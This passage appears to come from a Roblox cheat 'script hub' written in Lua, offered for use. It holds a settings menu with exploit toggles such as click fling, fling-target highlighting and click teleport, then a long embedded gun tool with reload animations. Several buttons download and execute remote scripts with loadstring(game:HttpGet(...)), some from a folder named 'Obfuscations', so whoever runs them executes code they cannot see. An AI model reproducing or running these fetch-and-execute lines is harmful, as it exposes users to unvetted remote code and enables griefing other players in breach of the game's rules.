			RightHip.C0=RightHip.C0:Lerp(cf(1,-1+0.3*sin((sine + 0.3)*4),0)*angles(1.5707963267948966,1.5707963267948966+0.6981317007977318*sin(sine*4)*rt,-1.5707963267948966+0.6981317007977318*sin(sine*4)*fw),deltaTime) 
			RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,0)*angles(-0.5235987755982988*sin((sine+0.2)*4),1.5707963267948966-0.3490658503988659*sin(sine*4),0),deltaTime) 
			LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,0)*angles(0.5235987755982988*sin((sine+0.2)*4),-1.5707963267948966-0.3490658503988659*sin(sine*4),0),deltaTime) 
			LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1-0.3*sin((sine + 0.3)*4),0)*angles(1.5707963267948966,-1.5707963267948966-0.6981317007977318*sin(sine*4)*rt,1.5707963267948966+0.6981317007977318*sin(sine*4)*fw),deltaTime) 
			RootJoint.C0=RootJoint.C0:Lerp(cf(0,0.05+0.2*sin((sine + 0.15)*8),0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
			--MW_animatorProgressSave: Fedora_Handle,8.657480066176504e-09,0,0,4,-6,0,0,4,-0.15052366256713867,0,0,4,0,0,0,4,-0.010221302509307861,0,0,4,0,0,0,4,Bandana_Handle,3.9362930692732334e-09,0,0,4,0,0,0,4,0.3000001907348633,0,0,4,0,0,0,4,-0.6002722978591919,0,0,4,0,0,0,4,Head,0,0,0,4,-90,5,-0.1,8,1,0,0,4,-0,20,-0.07,4,0,0,0,4,180,-25,-0.4,4,RightLeg,1,0,0,4,90,0,0,4,-1,0.3,0.3,4,90,40,0,4,0,0,0,4,-90,40,0,4,RightArm,1,0,0,4,0,-30,0.2,4,0.5,0,0,4,90,-20,0,4,0,0,0,4,0,0,0,4,LeftArm,-1,0,0,4,0,30,0.2,4,0.5,0,0,4,-90,-20,0,4,0,0,0,4,0,0,0,4,LeftLeg,-1,0,0,4,90,0,0,4,-1,-0.3,0.3,4,-90,-40,0,4,0,0,0,4,90,40,0,4,Torso,0,0,0,4,-90,0,0,4,0.05,0.2,0.15,8,-0,0,0,4,0,0,0,4,180,0,0,4
		end
	})
end)

lbl("INTERWORLD - METAMORPHOSIS")
lbl("was listening to ^^ and animating")

btn("empty reanimate (no animations)", reanimate)
btn("stop current script",function()
	stopreanimate()
end).TextColor3=c3(0.75,0,0)

lbl("SETTINGS (REANIMATE TO APPLY)")

local function swtc(txt,options,onchanged)
	local current=0
	local swtcbtn=nil
	local function btnpressed()
		current=current+1
		if current>#options then
			current=1
		end
		local option=options[current]
		swtcbtn.Text=txt..": "..option.text
		onchanged(option.value)
	end
	swtcbtn=btn("change",btnpressed)
	btnpressed()
	return swtcbtn
end

swtc("client sided placeholders",{
	{value=true,text="yes"},
	{value=false,text="no"}
},function(v)
	placeholders=v
end)

swtc("highlight fling targets",{
	{value=true,text="yes"},
	{value=false,text="no"}
},function(v)
	highlightflingtargets=v
end)

swtc("allow shiftlock",{
	{value=true,text="yes"},
	{value=false,text="no"}
},function(v)
	allowshiftlock=v
end)

swtc("ctrl click tp",{
	{value=true,text="yes"},
	{value=false,text="no"}
},function(v)
	ctrltp=v
end)

swtc("click fling",{
	{value=true,text="yes"},
	{value=false,text="no"}
},function(v)
	clickfling=v
end)

if type(shp)=="function" then
	swtc("simulation radius",{
		{value=1000,text="on"},
		{value=false,text="off"}
	},function(v)
		simrad=v
	end)
else
	lbl("simulation radius: unavailable")
end

local iscg,_=pcall(function()
	i9.Parent=cg
end)
if not iscg then
	local t=i6.Text
	i6.Text="PLAYERGUI MODE"
	i9.Parent=pg
	twait(3)
	i6.Text=t
end
end)

tab:Button("Emper reanimate", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectShade132/Emper-Reanimate-Github-Version-/main/message%20(12).txt"))()
end)

tab:Button("Genesis FE: Pistol", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Pistol"))()
end)

tab:Button("Genesis FE: Banisher", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Banisher"))()
end)

tab:Button("Genesis FE: Karambit", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Karambit"))()
end)

local tab = win:Tab("OFD Scripts")

tab:Button("AK", function()
--RPK-74 Script by DMS don't LEAK it's rarity is nice c:
local RPKTHing = function(f,scri)
local oldenv = getfenv(f)
local newenv = setmetatable({}, {
__index = function(_, k)
if k:lower() == 'script' then
return scri
else
return oldenv[k]
end
end
})
setfenv(f, newenv)
ypcall(function() f() end)
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting")) 
mas.Name = "So many of ur face"
o1 = Instance.new("Tool")
o1.Name = "RPK-74"
o1.Parent = mas
o1.GripForward = Vector3.new(-0.308719009, -0, -0.951153278)
o1.GripPos = Vector3.new(0, -0.300000012, 0.200000003)
o1.GripRight = Vector3.new(0.951153278, 0, -0.308719009)
o2 = Instance.new("NumberValue")
o2.Name = "Left"
o2.Parent = o1
o2.Value = 30
o3 = Instance.new("NumberValue")
o3.Name = "Recoil"
o3.Parent = o1
o3.Value = 2
o4 = Instance.new("Script")
o4.Parent = o3
table.insert(cors,coroutine.create(function()
wait()
RPKTHing(function()
while true do
wait(.2)
if script.Parent.Value > 3 then
script.Parent.Value = script.Parent.Value - 1
end
end

end,o4)
end))
o5 = Instance.new("NumberValue")
o5.Name = "MaxAmmo"
o5.Parent = o1
o5.Value = 50
o6 = Instance.new("NumberValue")
o6.Name = "Ammo"
o6.Parent = o1
o6.Value = 50
o7 = Instance.new("LocalScript")
o7.Name = "Crouch"
o7.Parent = o1
table.insert(cors,coroutine.create(function()
wait()
RPKTHing(function()
on = 0
Tool = script.Parent
welds = {}
sh = {}
arms = nil
torso = nil
f = nil
function Crouch(ison)
if arms == nil and torso == nil then
arms = {Tool.Parent:FindFirstChild("Left Leg"), Tool.Parent:FindFirstChild("Right Leg")}
torso = Tool.Parent:FindFirstChild("Torso")
end
if arms ~= nil and torso ~= nil then
sh = {torso:FindFirstChild("Left Hip"), torso:FindFirstChild("Right Hip")}
if sh ~= nil then
local yes = true
if yes then
yes = false
if ison == 1 then
sh[1].Part1 = nil
sh[2].Part1 = nil
local weld1 = Instance.new("Weld")
weld1.Part0 = torso
weld1.Parent = torso
weld1.Part1 = arms[1]
weld1.C1 = CFrame.new(-0.5, 0.75, 1)
arms[1].Name = "LDave"
arms[1].CanCollide = true
welds[1] = weld1
local weld2 = Instance.new("Weld")
weld2.Part0 = torso
weld2.Parent = torso
weld2.Part1 = arms[2]
weld2.C1 = CFrame.new(0.5,0.495,1.25) * CFrame.fromEulerAnglesXYZ(math.rad(90),0,0)
arms[2].Name = "RDave"
arms[2].CanCollide = true
welds[2] = weld2
local force = Instance.new("BodyForce")
force.Parent = torso
f = force
wait(0.01)
elseif ison == 0 then
if arms then
sh[1].Part1 = arms[1]
sh[2].Part1 = arms[2]
f.Parent = nil
arms[2].Name = "Right Leg"
arms[1].Name = "Left Leg"
welds[1].Parent = nil
welds[2].Parent = nil
end
end
end
else
print("sh")
end
else
print("arms")
end
end
function Key(key)
if key then
key = string.lower(key)
if (key=="c") then
if on == 1 then
on = 0
elseif on == 0 then
on = 1
end
Crouch(on)
end
end
end
function Equip(mouse)
mouse.KeyDown:connect(Key)
end
script.Parent.Equipped:connect(Equip)


end,o7)
end))
o8 = Instance.new("NumberValue")
o8.Name = "StoredAmmo"
o8.Parent = o1
o8.Value = 790
o9 = Instance.new("LocalScript")
o9.Name = "Shooter"
o9.Parent = o1
table.insert(cors,coroutine.create(function()
wait()
RPKTHing(function()
Tool = script.Parent

local arms = nil
local torso = nil
local weld33 = nil -- right arm
local weld55 = nil -- left arm
local welds = {}
local reloading = false
local firing = false
local canreload = true
local canshoot = true
local damage = 200

function ReloadSequence()
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), 0)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-92), math.rad(-16), 0)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(280), 1, math.rad(-0))
Tool.Handle.M1:play()
Tool.Mag.Transparency = 1
local mag = Tool.Mag:clone()
mag.Parent = game.Workspace
mag.CanCollide = false
mag.Transparency = 0
Tool.Mag2.Transparency = 1
local mag = Tool.Mag2:clone()
mag.Parent = game.Workspace
mag.CanCollide = false
mag.Transparency = 0
Tool.Mag3.Transparency = 1
local mag = Tool.Mag3:clone()
mag.Parent = game.Workspace
mag.CanCollide = false
mag.Transparency = 0
Tool.Mag4.Transparency = 1
local mag = Tool.Mag4:clone()
mag.Parent = game.Workspace
mag.CanCollide = false
mag.Transparency = 0
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-93), math.rad(-16), 0)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(285), 1, math.rad(-0))
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-93.1), math.rad(-16), 0)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(290), 1, math.rad(-0))
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-93.4), math.rad(-16), 0)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(295), 1, math.rad(-0))
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-93.7), math.rad(-16), 0)
weld55.C1 = CFrame.new(0.9, -0.3, 0.35) * CFrame.fromEulerAnglesXYZ(math.rad(300), 1.2, math.rad(-0))
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-93.7), math.rad(-16), 0)
weld55.C1 = CFrame.new(0.9, -0.65, 0.2) * CFrame.fromEulerAnglesXYZ(math.rad(305), 1.4, math.rad(-0))
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-93.6), math.rad(-16), 0.04)
weld55.C1 = CFrame.new(0.9, -1, 0.05) * CFrame.fromEulerAnglesXYZ(math.rad(310), 1.6, math.rad(-0))
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-93.7), math.rad(-16), 0.03)
weld55.C1 = CFrame.new(0.9, -1, 0.05) * CFrame.fromEulerAnglesXYZ(math.rad(315), 1.6, math.rad(-0))
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-93.9), math.rad(-16), 0.03)
weld55.C1 = CFrame.new(0.9, -1, 0.05) * CFrame.fromEulerAnglesXYZ(math.rad(320), 1.6, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-94.2), math.rad(-16), 0.03)
weld55.C1 = CFrame.new(0.9, -0.65, 0.2) * CFrame.fromEulerAnglesXYZ(math.rad(320), 1.4, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-94.5), math.rad(-16), 0.02)
weld55.C1 = CFrame.new(0.9, -0.3, 0.35) * CFrame.fromEulerAnglesXYZ(math.rad(320), 1.2, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-94.9), math.rad(-16), 0.02)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(320), 1, math.rad(-0))
Tool.Mag.Transparency = 0
Tool.Mag2.Transparency = 0
Tool.Mag3.Transparency = 0
Tool.Mag4.Transparency = 0
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -1.35)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.315, -1.26)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -1.17, 0.63)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.99, 0.9)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-95), math.rad(-16), 0.02)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(315), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -1.2)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.28, -1.12)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -1.04, 0.56)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.88, 0.8)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-95), math.rad(-16), 0.03)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(310), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -1.05)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.245, -0.98)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -0.91, 0.49)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.77, 0.7)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-95), math.rad(-16), 0.03)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(305), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -0.9)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.21, -0.84)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -0.78, 0.42)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.66, 0.6)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-95), math.rad(-16), 0.02)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(300), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -0.75)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.175, -0.7)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -0.65, 0.35)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.55, 0.5)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-95), math.rad(-16), 0.02)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(295), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -0.6)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.14, -0.56)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -0.52, 0.28)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.44, 0.4)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-94.5), math.rad(-16), 0.02)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(290), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -0.45)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.105, -0.42)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -0.39, 0.21)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.33, 0.3)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-94.5), math.rad(-16), 0.02)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(285), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -0.3)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.7, -0.28)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -0.26, 0.14)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.22, 0.2)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-94.5), math.rad(-16), 0.02)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(280), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -0.15)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.035, -0.14)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -0.13, 0.07)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.11, 0.1)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-94.5), math.rad(-16), 0.01)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, 0)
Tool.Mag2.Mesh.Offset = Vector3.new(0, 0, 0)
Tool.Mag3.Mesh.Offset = Vector3.new(0, 0, 0)
Tool.Mag4.Mesh.Offset = Vector3.new(0, 0, 0)
Tool.Handle.M2:play()
Tool.Handle.M2.TimePosition = .8
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-92.2), math.rad(-16), 0.01)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-91.1), math.rad(-16), 0.01)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(275), 0.9, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), 0.01)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(275), 0.8, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), 0)
weld55.C1 = CFrame.new(-0.45, 0.85, 1) * CFrame.fromEulerAnglesXYZ(math.rad(310), 0.1, math.rad(-94))
end

function ReloadSequence2()
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-16), 0)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-92), math.rad(-16), 0)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(280), 1, math.rad(-0))
Tool.Handle.M1:play()
Tool.Mag.Transparency = 1
local mag = Tool.Mag:clone()
mag.Parent = game.Workspace
mag.CanCollide = false
mag.Transparency = 0
Tool.Mag2.Transparency = 1
local mag = Tool.Mag2:clone()
mag.Parent = game.Workspace
mag.CanCollide = false
mag.Transparency = 0
Tool.Mag3.Transparency = 1
local mag = Tool.Mag3:clone()
mag.Parent = game.Workspace
mag.CanCollide = false
mag.Transparency = 0
Tool.Mag4.Transparency = 1
local mag = Tool.Mag4:clone()
mag.Parent = game.Workspace
mag.CanCollide = false
mag.Transparency = 0
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-93), math.rad(-16), 0)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(285), 1, math.rad(-0))
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-93.1), math.rad(-16), 0)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(290), 1, math.rad(-0))
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-93.4), math.rad(-16), 0)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(295), 1, math.rad(-0))
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-93.7), math.rad(-16), 0)
weld55.C1 = CFrame.new(0.9, -0.3, 0.35) * CFrame.fromEulerAnglesXYZ(math.rad(300), 1.2, math.rad(-0))
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-93.7), math.rad(-16), 0)
weld55.C1 = CFrame.new(0.9, -0.65, 0.2) * CFrame.fromEulerAnglesXYZ(math.rad(305), 1.4, math.rad(-0))
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-93.6), math.rad(-16), 0.04)
weld55.C1 = CFrame.new(0.9, -1, 0.05) * CFrame.fromEulerAnglesXYZ(math.rad(310), 1.6, math.rad(-0))
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-93.7), math.rad(-16), 0.03)
weld55.C1 = CFrame.new(0.9, -1, 0.05) * CFrame.fromEulerAnglesXYZ(math.rad(315), 1.6, math.rad(-0))
wait(.04)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-93.9), math.rad(-16), 0.03)
weld55.C1 = CFrame.new(0.9, -1, 0.05) * CFrame.fromEulerAnglesXYZ(math.rad(320), 1.6, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-94.2), math.rad(-16), 0.03)
weld55.C1 = CFrame.new(0.9, -0.65, 0.2) * CFrame.fromEulerAnglesXYZ(math.rad(320), 1.4, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-94.5), math.rad(-16), 0.02)
weld55.C1 = CFrame.new(0.9, -0.3, 0.35) * CFrame.fromEulerAnglesXYZ(math.rad(320), 1.2, math.rad(-0))
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-94.9), math.rad(-16), 0.02)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(320), 1, math.rad(-0))
Tool.Mag.Transparency = 0
Tool.Mag2.Transparency = 0
Tool.Mag3.Transparency = 0
Tool.Mag4.Transparency = 0
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -1.35)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.315, -1.26)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -1.17, 0.63)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.99, 0.9)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-95), math.rad(-16), 0.02)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(315), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -1.2)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.28, -1.12)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -1.04, 0.56)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.88, 0.8)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-95), math.rad(-16), 0.03)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(310), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -1.05)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.245, -0.98)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -0.91, 0.49)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.77, 0.7)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-95), math.rad(-16), 0.03)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(305), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -0.9)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.21, -0.84)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -0.78, 0.42)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.66, 0.6)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-95), math.rad(-16), 0.02)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(300), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -0.75)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.175, -0.7)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -0.65, 0.35)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.55, 0.5)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-95), math.rad(-16), 0.02)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(295), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -0.6)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.14, -0.56)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -0.52, 0.28)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.44, 0.4)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-94.5), math.rad(-16), 0.02)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(290), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -0.45)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.105, -0.42)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -0.39, 0.21)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.33, 0.3)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-94.5), math.rad(-16), 0.02)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(285), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -0.3)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.7, -0.28)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -0.26, 0.14)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.22, 0.2)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-94.5), math.rad(-16), 0.02)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(280), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, -0.15)
Tool.Mag2.Mesh.Offset = Vector3.new(0, -0.035, -0.14)
Tool.Mag3.Mesh.Offset = Vector3.new(0, -0.13, 0.07)
Tool.Mag4.Mesh.Offset = Vector3.new(0, -0.11, 0.1)
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-94.5), math.rad(-16), 0.01)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
Tool.Mag.Mesh.Offset = Vector3.new(0, 0, 0)
Tool.Mag2.Mesh.Offset = Vector3.new(0, 0, 0)
Tool.Mag3.Mesh.Offset = Vector3.new(0, 0, 0)
Tool.Mag4.Mesh.Offset = Vector3.new(0, 0, 0)
Tool.Handle.M2:play()
Tool.Handle.M2.TimePosition = .8
wait(.06)
weld33.C1 = CFrame.new(-0.75, -0.6, 0.25) * CFrame.fromEulerAnglesXYZ(math.rad(-92.2), math.rad(-16), 0.01)
weld55.C1 = CFrame.new(0.9, 0.05, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(275), 1, math.rad(-0))
